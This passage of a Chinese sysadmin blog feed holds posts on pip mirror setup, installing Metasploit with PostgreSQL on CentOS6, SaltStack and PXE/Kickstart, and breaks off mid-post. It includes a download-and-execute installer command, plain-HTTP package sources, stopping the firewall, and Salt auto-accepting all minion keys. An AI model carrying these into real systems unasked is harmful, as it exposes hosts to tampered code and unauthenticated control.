title="提示："></a>提示：</h2><p>openssl1.1.0目前兼容性很不好，大部分的软件都不支持<br>目前支持的有nginx-1.11.5、curl-7.50.3<br>不支持的有PHP-7.0.12、openssh-7.3p1<br>所以如果决定使用openssl1.1.0需要考虑很多兼容问题，必须保留1.0.2或1.0.1(不推荐，存在一些已知漏洞，最重要的是如果服务器要开http2，由于新版chrome必须使用ALPN的限制，只有1.0.2版本支持ALPN，所以必须升级到1.0.2)版本以便编译其他程序。</p>]]></content>
      
      <categories>
          
          <category> ErrorNote </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>更改pip源为国内阿里源</title>
      <link href="/2016/12/15/linux-pip/"/>
      <url>/2016/12/15/linux-pip/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>pip默认源为国外，so提高下载速度更换国内阿里源，及apt源、定制bash命令行提示符，废话不多直进主题</p></blockquote><a id="more"></a><h2 id="1-创建配置文件"><a href="#1-创建配置文件" class="headerlink" title="1. 创建配置文件"></a>1. 创建配置文件</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">mkdir ~/.pip/ &amp;&amp; <span class="built_in">cd</span> ~/.pip/; vim pip.conf</div></pre></div></div></figure><h2 id="2-添加阿里源"><a href="#2-添加阿里源" class="headerlink" title="2. 添加阿里源"></a>2. 添加阿里源</h2><p>添加如下内容</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">[global]</div><div class="line">index-url = http://mirrors.aliyun.com/pypi/simple/</div><div class="line"></div><div class="line">[install]</div><div class="line">trusted-host=mirrors.aliyun.com</div></pre></div></div></figure><h2 id="3-测试"><a href="#3-测试" class="headerlink" title="3. 测试"></a>3. 测试</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line">root@kalivi[12:13].pip:<span class="comment"># pip install --upgrade pip</span></div><div class="line">You are using pip version 7.1.0, however version 9.0.1 is available.</div><div class="line">You should consider upgrading via the <span class="string">'pip install --upgrade pip'</span> <span class="built_in">command</span>.</div><div class="line">Collecting pip</div><div class="line">  Downloading http://mirrors.aliyun.com/pypi/packages/b6/ac/7015eb97dc749283ffdec1c3a88ddb8ae03b8fad0f0e611408f196358da3/pip-9.0.1-py2.py3-none-any.whl (1.3MB)</div><div class="line">    100% |████████████████████████████████| 1.3MB 5.0MB/s </div><div class="line">Installing collected packages: pip</div><div class="line">  Found existing installation: pip 7.1.0</div><div class="line">    Uninstalling pip-7.1.0:</div><div class="line">      Successfully uninstalled pip-7.1.0</div><div class="line">Successfully installed pip-9.0.1</div></pre></div></div></figure><h2 id="附上kali-rolling清华大学apt镜像源"><a href="#附上kali-rolling清华大学apt镜像源" class="headerlink" title="附上kali rolling清华大学apt镜像源"></a>附上kali rolling清华大学apt镜像源</h2><blockquote><p>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main non-free contrib</p></blockquote><h2 id="定制bash命令行提示符"><a href="#定制bash命令行提示符" class="headerlink" title="定制bash命令行提示符"></a>定制bash命令行提示符</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">"PS1='\[\e[31m\]\u@\h\[\e[m\][\A]\[\e[34m\]\W:\[\e[34m\]\$\[\e[m\] '"</span> &gt;&gt; ~/.bashrc &amp;&amp; <span class="built_in">source</span> ~/.bashrc</div><div class="line"></div><div class="line">root@kalivi[12:23]~:<span class="comment">#</span></div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
          <category> pip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pip </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RedHat6/CentOS6 安装Metasploit</title>
      <link href="/2016/12/06/kali-metasploit/"/>
      <url>/2016/12/06/kali-metasploit/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/banner.png" alt="kionf"></p><blockquote><p>本章记录在RedHat6/CentOS6上安装Metasploit，因为坑队友给了台Redhat6系统的云主机。只能自己搞起来了</p></blockquote><a id="more"></a><h2 id="1-Metasploit"><a href="#1-Metasploit" class="headerlink" title="1. Metasploit"></a>1. Metasploit</h2><p><strong>msf这部分<code>msfinstall</code>脚本会自动来安装，所以需要配置的也比较少</strong></p><p>下载官方提供的安装脚本，并执行</p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp;   chmod 755 msfinstall &amp;&amp;   ./msfinstall</div></pre></div></div></figure><blockquote><p>静静等待它下载完。。。<code>msfinstall</code>脚本只会安装metasploit，不会安装postgresql</p></blockquote><h2 id="2-Postgresql"><a href="#2-Postgresql" class="headerlink" title="2. Postgresql"></a>2. Postgresql</h2><p><code>yum -y install postgresql postgresql-server</code></p><blockquote><p>这里我使用的是epel源<br> <code>rpm -ivh http://dl.fedoraproject.org/pub/epel/6Server/x86_64/epel-release-6-8.noarch.rpm</code><br> <code>yum clean all &amp;&amp; yum makecache</code></p></blockquote><h2 id="3-配置Postgresql"><a href="#3-配置Postgresql" class="headerlink" title="3. 配置Postgresql"></a>3. 配置Postgresql</h2><h3 id="1-添加数据库，用户"><a href="#1-添加数据库，用户" class="headerlink" title="(1)添加数据库，用户"></a>(1)添加数据库，用户</h3><p><strong>初始化启动 :</strong></p><p><code>service postgresql initdb</code></p><p><code>service postgresql start</code></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></div><div class="code"><pre><div class="line"><span class="meta">#</span><span class="bash">切换到普通用户</span></div><div class="line">su - postgres</div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash">创建数据库和用户</span></div><div class="line">psql</div><div class="line"></div><div class="line">postgres=# create user "youruser" with password 'yourpasswd' nocreatedb;</div><div class="line">CREATE ROLE</div><div class="line"></div><div class="line">postgres=# create database "msf4" with owner="youruser";</div><div class="line">CREATE DATABASE</div><div class="line"></div><div class="line">postgres=# \q</div><div class="line">退出</div></pre></div></div></figure><h3 id="2-修改服务配置文件"><a href="#2-修改服务配置文件" class="headerlink" title="(2)修改服务配置文件"></a>(2)修改服务配置文件</h3><p><code>切换回root</code></p><p><code>vim /var/lib/pgsql/data/postgresql.conf</code></p><blockquote><p>在我的机器上是这个文件，有可能会不同，名字一样自行查找</p></blockquote><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line"><span class="meta">#</span><span class="bash">共修改2处</span></div><div class="line"></div><div class="line">更改 #listen_addresses = 'localhost'</div><div class="line">为 listen_addresses = '127.0.0.1'</div><div class="line"></div><div class="line">更改 #password_encryption = on</div><div class="line">为 password_encryption = on</div></pre></div></div></figure><p><code>vim /var/lib/pgsql/data/pg_hba.conf</code></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="meta">#</span><span class="bash">文件末尾处</span></div><div class="line">更改 host    all         all         127.0.0.1/32          ident</div><div class="line">为 host    all         all         127.0.0.1/32          md5</div></pre></div></div></figure><h3 id="3-重启服务"><a href="#3-重启服务" class="headerlink" title="(3)重启服务"></a>(3)重启服务</h3><p><code>service postgresql restart</code></p><p><code>psql -U youruser -h 127.0.0.1 -dmsf4</code></p><p><strong>测试是否配置成功</strong></p><h2 id="4-配置Metasploit"><a href="#4-配置Metasploit" class="headerlink" title="4. 配置Metasploit"></a>4. 配置Metasploit</h2><p><code>vim /root/.msf4/database.yml</code></p><p><strong>添加如下内容</strong></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">production:</div><div class="line">  adapter: "postgresql"</div><div class="line">  database: "msf4"</div><div class="line">  username: "youruser"</div><div class="line">  password: "yourpasswd"</div><div class="line">  host: "127.0.0.1"</div><div class="line">  port: 5432</div><div class="line">  pool: 5</div><div class="line">  timeout: 5</div></pre></div></div></figure><p><code>cp /root/.msf4/database.yml /var/lib/pgsql/.msf4/database.yml</code></p><blockquote><p>msf初始化数据库</p></blockquote><p><code>su - postgres</code></p><p><code>msfdb init</code></p><h2 id="5-运行msf"><a href="#5-运行msf" class="headerlink" title="5. 运行msf"></a>5. 运行msf</h2><p><code>msfconsole</code></p><p><strong>查看数据库连接状态</strong></p><p><code>msf &gt; db_status</code></p><p><code>[*] postgresql connected to msf4</code>#表示连接成功</p><blockquote><p>当使用search搜索模板会提示<code>[!] Module database cache not built yet, using slow search</code>意思是数据库没有建立缓存</p></blockquote><p><code>msf &gt; db_rebuild_cache</code></p><p>这样就会在后台建立数据库缓存了，至此全部安装配置已完成。后面会写一写关于metasploit的应用。</p>]]></content>
      
      <categories>
          
          <category> Sec </category>
          
          <category> metasploit </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux 自动化运维之SlatStack安装</title>
      <link href="/2016/07/18/linux-saltstack01/"/>
      <url>/2016/07/18/linux-saltstack01/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>slatstack入门安装 </p></blockquote><a id="more"></a><h1 id="saltstack基本原理："><a href="#saltstack基本原理：" class="headerlink" title="saltstack基本原理："></a>saltstack基本原理：</h1><blockquote><p><code>SaltStack</code>采用 C/S模式，server端就是salt的<code>master</code>，client端就是<code>minion</code>，minion与master之间通过ZeroMQ消息队列通信，<strong>是一个同时对一组服务器进行远程执行命令和状态管理的工具。</strong></p></blockquote><blockquote><p>minion上线后先与master端联系，把自己的<code>pub key</code>发过去，这时master端通过salt-key -L命令就会看到minion的key，接受该minion-key后，也就是master与minion已经互信</p></blockquote><blockquote><p> <code>master</code>可以发送任何指令让<code>minion</code>执行了，salt有很多可执行模块，比如说cmd模块，在安装minion的时候已经自带了，它们通常位于你的python库中，<code>locate salt | grep /usr/</code>可以看到salt自带的所有东西。</p></blockquote><blockquote><p> 这些模块是python写成的文件，里面会有好多函数，如cmd.run，当我们执行<code>salt &#39;*&#39; cmd.run &#39;uptime&#39;</code>的时候，master下发任务匹配到的minion上去，minion执行模块函数，并返回结果。master监听<strong>4505</strong>和<strong>4506</strong>端口，4505对应的是ZMQ的PUB system，用来发送消息，4506对应的是REP system是来接受消息的。</p></blockquote><h3 id="具体步骤如下"><a href="#具体步骤如下" class="headerlink" title="具体步骤如下:"></a>具体步骤如下:</h3><ol><li><p>Salt stack的Master与Minion之间通过ZeroMq进行消息传递，使用了ZeroMq的发布-订阅模式，连接方式包括<code>tcp</code>，<code>ipc</code></p></li><li><p>salt命令，将<code>cmd.run ls</code>命令从<code>salt.client.LocalClient.cmd_cli</code>发布到master，获取一个Jodid，根据jobid获取命令执行结果。</p></li><li><p>master接收到命令后，将要执行的命令发送给客户端minion。</p></li><li><p>minion从消息总线上接收到要处理的命令，交给<code>minion._handle_aes</code>处理</p></li><li><p><code>minion._handle_aes</code>发起一个本地线程调用cmdmod执行ls命令。线程执行完ls后，调用minion._return_pub方法，将执行结果通过消息总线返回给master</p></li><li><p>master接收到客户端返回的结果，调用<code>master._handle_aes</code>方法，将结果写的文件中</p></li><li><p><code>salt.client.LocalClient.cmd_cli</code>通过轮询获取Job执行结果，将结果输出到终端。</p></li></ol><p><strong>下面让我们来使用它，才能更好的理解它的工作模式和原理</strong></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul><li>CentOS6/Redhat6</li></ul><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">sudo yum install https://repo.saltstack.com/yum/redhat/salt-repo-latest-1.el6.noarch.rpm</div></pre></div></div></figure><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">yum clean all</div></pre></div></div></figure><ul><li>安装salt-minion, salt-master, 或者其它组件</li></ul><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">sudo yum install salt-master<span class="comment">#server端</span></div><div class="line">sudo yum install salt-minion<span class="comment">#client端</span></div><div class="line">sudo yum install salt-ssh</div><div class="line">sudo yum install salt-syndic</div><div class="line">sudo yum install salt-cloud</div><div class="line">sudo yum install salt-api</div></pre></div></div></figure><p><strong>服务端</strong></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">sudo yum install salt-master</div></pre></div></div></figure><p><strong>客户端</strong></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">sudo yum install salt-minion</div></pre></div></div></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置  :"></a>配置  :</h2><h3 id="服务端-vim-etc-salt-master"><a href="#服务端-vim-etc-salt-master" class="headerlink" title="服务端 vim /etc/salt/master"></a>服务端 <code>vim /etc/salt/master</code></h3><p><em>#master消息发布端口 Default: 4505</em></p><p><code>publish_port: 4505</code>    </p><p><em>#工作线程数，应答和接受minion Default: 5</em></p><p><code>worker_threads: 100</code></p><p><em>#客户端与服务端通信的端口 Default: 4506</em></p><p><code>ret_port: 4506</code>    </p><p><em># 自动接受所有客户端</em></p><p><code>auto_accept: True</code> </p><p><em># 自动认证配置</em>   </p><p><code>autosign_file: /etc/salt/autosign.conf</code></p><h3 id="客户端-vim-etc-salt-minion"><a href="#客户端-vim-etc-salt-minion" class="headerlink" title="客户端 vim /etc/salt/minion"></a>客户端 <code>vim /etc/salt/minion</code></h3><p><em># master IP或域名</em></p><p><code>master: 10.0.0.1</code></p><p><em># 客户端与服务端通信的端口。 Default: 4506</em></p><p><code>syndic_master_port: 4506</code></p><p><em># 建议线上用ip显示或业务编号</em></p><p><code>id: test</code></p><blockquote><p>id minion的唯一标示。Default: hostname <em><br>minion id：minion的唯一标示，默认为minion的hostname，如果id修改了，master 需要重新认证。<br>（通过tcpdump做了个实验，修改minion id后，master上会新增一个id，但老id也还在，执行salt ‘</em>‘ test.ping的时候，执行时间变长了，延迟时间约为14s，而且master会在发送命令后延迟10s再给每个已经执行成功的minion发送一个包并有minion有返回，如果没有老id存在不会发送，可以理解为mater在向每个minion寻求未连接的id的信息，minion的salt服务关闭也是这种情况，修改timeout值无效。）</p></blockquote><h2 id="测试命令-："><a href="#测试命令-：" class="headerlink" title="测试命令 ："></a>测试命令 ：</h2><p><code>测试环境中关闭 iptbles！！</code></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">service iptables stop</div></pre></div></div></figure><p><strong>master端执行</strong></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">salt-key -L</div><div class="line">salt-key -A</div></pre></div></div></figure><p><em>查看到minion端ip表示成功</em></p><blockquote><p>Accepted Keys:<br>192.168.1.3<br>Denied Keys:<br>Unaccepted Keys:<br>Rejected Keys:</p></blockquote><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">salt '*' test.ping</div></pre></div></div></figure><blockquote><p>192.168.1.3:<br>    True</p></blockquote><p><em>Posted by : DY</em></p>]]></content>
      
      <categories>
          
          <category> 自动化运维 </category>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Saltstack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kickstart无人值守安装Linux</title>
      <link href="/2016/05/12/linux-kickstart/"/>
      <url>/2016/05/12/linux-kickstart/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>作为中小公司的运维，经常会遇到一些机械式的重复工作，例如：有时公司同时上线几十甚至上百台服务器，而且需要我们在短时间内完成系统安装。</p><p>OK让我们来一起kickstart吧</p></blockquote><a id="more"></a><h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h1><p><code>理论性知识建议大概看下,先按照步骤做一遍知到大概思路,在仔细看会更好(个人建议)</code></p><h2 id="1-什么是PXE"><a href="#1-什么是PXE" class="headerlink" title="1) 什么是PXE?"></a>1) 什么是PXE?</h2><blockquote><p>PXE，全名<code>Pre-boot Execution Environment</code>，预启动执行环境；<br>通过网络接口启动计算机，不依赖本地存储设备（如硬盘）或本地已安装的操作系统；<br>由Intel和Systemsoft公司于1999年9月20日公布的技术；<br><code>Client/Server的工作模式:</code><br>PXE客户端会调用网际协议(IP)、用户数据报协议(UDP)、动态主机设定协议(DHCP)、小型文件传输协议(TFTP)等网络协议；<br>PXE客户端(client)这个术语是指机器在PXE启动过程中的角色。一个PXE客户端可以是一台服务器、笔记本电脑或者其他装有PXE启动代码的机器（我们电脑的网卡）。</p></blockquote><h2 id="2-PXE工作过程"><a href="#2-PXE工作过程" class="headerlink" title="2) PXE工作过程"></a>2) PXE工作过程</h2><p><img src="http://ww1.sinaimg.cn/large/0060lm7Tgw1f6xsskxex0j30gn0fptar.jpg" alt="PXE"></p><h3 id="1-PXE-Client向DHCP发送请求"><a href="#1-PXE-Client向DHCP发送请求" class="headerlink" title="1. PXE Client向DHCP发送请求"></a>1. PXE Client向DHCP发送请求</h3><p>PXE Client从自己的PXE网卡启动，通过PXE BootROM(自启动芯片)会以UDP(简单用户数据报协议)发送一个广播请求，向本网络中的DHCP服务器索取IP。</p><h3 id="2-DHCP服务器提供信息"><a href="#2-DHCP服务器提供信息" class="headerlink" title="2. DHCP服务器提供信息"></a>2. DHCP服务器提供信息</h3><p>DHCP服务器收到客户端的请求，验证是否来至合法的PXE Client的请求，验证通过它将给客户端一个“提供”响应，这个“提供”响应中包含了为客户端分配的IP地址、pxelinux启动程序(TFTP)位置，以及配置文件所在位置。</p><h3 id="3-PXE客户端请求下载启动文件"><a href="#3-PXE客户端请求下载启动文件" class="headerlink" title="3. PXE客户端请求下载启动文件"></a>3. PXE客户端请求下载启动文件</h3><p>客户端收到服务器的“回应”后，会回应一个帧，以请求传送启动所需文件。这些启动文件包括：pxelinux.0、pxelinux.cfg/default、vmlinuz、initrd.img等文件。</p><h3 id="4-Boot-Server响应客户端请求并传送文件"><a href="#4-Boot-Server响应客户端请求并传送文件" class="headerlink" title="4. Boot Server响应客户端请求并传送文件"></a>4. Boot Server响应客户端请求并传送文件</h3><p>当服务器收到客户端的请求后，他们之间之后将有更多的信息在客户端与服务器之间作应答, 用以决定启动参数。BootROM由TFTP通讯协议从Boot Server下载启动安装程序所必须的文件(pxelinux.0、pxelinux.cfg/default)。default文件下载完成后，会根据该文件中定义的引导顺序，启动Linux安装程序的引导内核。</p><h3 id="5-请求下载自动应答文件"><a href="#5-请求下载自动应答文件" class="headerlink" title="5. 请求下载自动应答文件"></a>5. 请求下载自动应答文件</h3><p>客户端通过pxelinux.cfg/default文件成功的引导Linux安装内核后，安装程序首先必须确定你通过什么安装介质来安装linux，如果是通过网络安装(NFS, FTP, HTTP)，则会在这个时候初始化网络，并定位安装源位置。接着会读取default文件中指定的自动应答文件ks.cfg所在位置，根据该位置请求下载该文件。</p><blockquote><p>这里有个问题，在第2步和第5步初始化2次网络了，这是由于PXE获取的是安装用的内核以及安装程序等，而安装程序要获取的是安装系统所需的二进制包以及配置文件。因此PXE模块和安装程序是相对独立的，PXE的网络配置并不能传递给安装程序，从而进行两次获取IP地址过程，但IP地址在DHCP的租期内是一样的。</p></blockquote><h3 id="6-客户端安装操作系统"><a href="#6-客户端安装操作系统" class="headerlink" title="6. 客户端安装操作系统"></a>6. 客户端安装操作系统</h3><p>将ks.cfg文件下载回来后，通过该文件找到OS Server，并按照该文件的配置请求下载安装过程需要的软件包。<br>OS Server和客户端建立连接后，将开始传输软件包，客户端将开始安装操作系统。安装完成后，将提示重新引导计算机。</p><h1 id="2-安装DHCP服务"><a href="#2-安装DHCP服务" class="headerlink" title="2. 安装DHCP服务"></a>2. 安装DHCP服务</h1><p><strong><code>如果是用虚拟机测试需要关闭虚拟网卡DHCP功能</code></strong></p><h2 id="1-安装包"><a href="#1-安装包" class="headerlink" title="1) 安装包"></a>1) 安装包</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">[root@CentOS6.5 ~]<span class="comment"># yum -y install dhcp</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># rpm -ql dhcp |grep "dhcpd.conf"</span></div><div class="line">/etc/dhcp/dhcpd.conf   <span class="comment"># 查看配置文件位置</span></div><div class="line">/usr/share/doc/dhcp-4.1.1/dhcpd-conf-to-ldap</div><div class="line">/usr/share/doc/dhcp-4.1.1/dhcpd.conf.sample</div><div class="line">/usr/share/man/man5/dhcpd.conf.5.gz</div></pre></div></div></figure><h2 id="2-编辑配置文件"><a href="#2-编辑配置文件" class="headerlink" title="2) 编辑配置文件"></a>2) 编辑配置文件</h2><p><code>[root@CentOS6.5 ~]# vim /etc/dhcp/dhcp.conf</code></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">default-lease-time 14400;</div><div class="line">ddns-update-style none;</div><div class="line">next-server 192.168.1.52;<span class="comment">#指定tftpd服务器ip</span></div><div class="line">filename <span class="string">"pxelinux.0"</span>;</div><div class="line">subnet 192.168.1.0 netmask 255.255.255.0 &#123;<span class="comment">#地址池</span></div><div class="line">        range 192.168.1.50 192.168.1.240;</div><div class="line">        default-lease-time 14400;               <span class="comment"># 设置默认的IP租用期限</span></div><div class="line">        max-lease-time 172800;</div><div class="line">&#125;</div></pre></div></div></figure><p><code>[root@CentOS6.5 ~]# vim /etc/sysconfig/dhcpd</code></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">DHCPDARGS=eth1  <span class="comment"># 指定监听网卡</span></div></pre></div></div></figure><p><code>[root@CentOS6.5 ~]# service dhcpd restart</code></p><h1 id="3-安装TFTP"><a href="#3-安装TFTP" class="headerlink" title="3. 安装TFTP"></a>3. 安装TFTP</h1><h2 id="1-TFTP简介"><a href="#1-TFTP简介" class="headerlink" title="1) TFTP简介:"></a>1) TFTP简介:</h2><p><code>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是TCP/IP协议族中的一个用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的文件传输服务。端口号为69。</code></p><h2 id="2-TFTP安装配置"><a href="#2-TFTP安装配置" class="headerlink" title="2) TFTP安装配置"></a>2) TFTP安装配置</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></div><div class="code"><pre><div class="line">[root@CentOS6.5 ~]<span class="comment"># yum -y install tftp-server</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># vim /etc/xinetd.d/tftp</span></div><div class="line">service tftp</div><div class="line">&#123;</div><div class="line">        socket_type             = dgram</div><div class="line">        protocol                = udp</div><div class="line">        <span class="built_in">wait</span>                    = yes</div><div class="line">        user                    = root</div><div class="line">        server                  = /usr/sbin/in.tftpd</div><div class="line">        server_args             = -s /var/lib/tftpboot <span class="comment"># 指定目录，保持默认，不用修改</span></div><div class="line">        <span class="built_in">disable</span>                 = no <span class="comment"># 由原来的yes改为no</span></div><div class="line">        per_source              = 11</div><div class="line">        cps                     = 100 2</div><div class="line">        flags                   = IPv4</div><div class="line">&#125;</div><div class="line">[root@CentOS6.5 ~]<span class="comment"># /etc/init.d/xinetd restart</span></div><div class="line">Stopping xinetd:                                           [FAILED]</div><div class="line">Starting xinetd:                                           [  OK  ]</div><div class="line">[root@CentOS6.5 ~]<span class="comment"># netstat -tunlp|grep 69</span></div><div class="line">udp        0      0 0.0.0.0:69            0.0.0.0:*      1106/xinetd</div></pre></div></div></figure><h1 id="4-安装HTTP服务"><a href="#4-安装HTTP服务" class="headerlink" title="4. 安装HTTP服务"></a>4. 安装HTTP服务</h1><p><strong><code>可以用Apache或Nginx提供HTTP服务。Python的命令web服务不行，会有报错。</code></strong></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></div><div class="code"><pre><div class="line">[root@CentOS6.5 ~]<span class="comment"># yum -y install httpd</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># sed -i "277i ServerName 127.0.0.1:80" /etc/httpd/conf/httpd.conf</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># /etc/init.d/httpd start</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># mkdir /var/www/html/CentOS-6.5</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># mount /dev/sr0 /var/www/html/CentOS-6.5/ #sr0测试虚拟机环境线上会不同</span></div><div class="line">mount: block device /dev/sr0 is write-protected, mounting <span class="built_in">read</span>-only</div><div class="line">[root@CentOS6.5 ~]<span class="comment"># df -h</span></div><div class="line">Filesystem      Size  Used Avail Use% Mounted on</div><div class="line">/dev/sda3        19G  2.4G   16G  14% /</div><div class="line">tmpfs           491M   16K  491M   1% /dev/shm</div><div class="line">/dev/sda1       190M   36M  145M  20% /boot</div><div class="line">/dev/sr0        3.7G  3.7G     0 100% /var/www/html/CentOS-6.5</div><div class="line"><span class="comment"># 不管怎么弄，只要把安装光盘内容能通过web发布即可。因为是演示，如果复制镜像就有点浪费时间。但生产环境就一定要复制了，光盘读取速度有限。</span></div></pre></div></div></figure><p>浏览器访问测试配置是否成功<code>http://IP/CentOS-6.5</code></p><h1 id="5-配置支持PXE的启动程序"><a href="#5-配置支持PXE的启动程序" class="headerlink" title="5. 配置支持PXE的启动程序"></a>5. 配置支持PXE的启动程序</h1><p><code>syslinux是一个功能强大的引导加载程序，而且兼容各种介质。SYSLINUX是一个小型的Linux操作系统，它的目的是简化首次安装Linux的时间，并建立修护或其它特殊用途的启动盘。如果没有找到pxelinux.0这个文件,可以安装一下。</code></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></div><div class="code"><pre><div class="line">[root@CentOS6.5 ~]<span class="comment"># yum -y install syslinux</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># cp /usr/share/syslinux/pxelinux.0 /var/lib/tftpboot/</span></div><div class="line"><span class="comment"># 复制启动菜单程序文件</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># cp -a /var/www/html/CentOS-6.5/isolinux/* /var/lib/tftpboot/</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># ls /var/lib/tftpboot/</span></div><div class="line">boot.cat  grub.conf   isolinux.bin  memtest     splash.jpg  vesamenu.c32</div><div class="line">boot.msg  initrd.img  isolinux.cfg  pxelinux.0  TRANS.TBL   vmlinuz</div><div class="line"><span class="comment"># 新建一个pxelinux.cfg目录，存放客户端的配置文件。</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># mkdir -p /var/lib/tftpboot/pxelinux.cfg</span></div><div class="line">[root@CentOS6.5 ~]<span class="comment"># cp /var/www/html/CentOS-6.5/isolinux/isolinux.cfg /var/lib/tftpboot/pxelinux.cfg/default</span></div></pre></div></div></figure><h1 id="6-测试手动网络安装"><a href="#6-测试手动网络安装" class="headerlink" title="6. 测试手动网络安装"></a>6. 测试手动网络安装</h1><p><code>开启一个新的虚拟机内存给1GB,不出错误会看到光盘安装界面, 接下来就是创建ks.cfg了. 关闭测试虚拟机,继续</code></p><h1 id="7-创建ks-cfg文件"><a href="#7-创建ks-cfg文件" class="headerlink" title="7. 创建ks.cfg文件"></a>7. 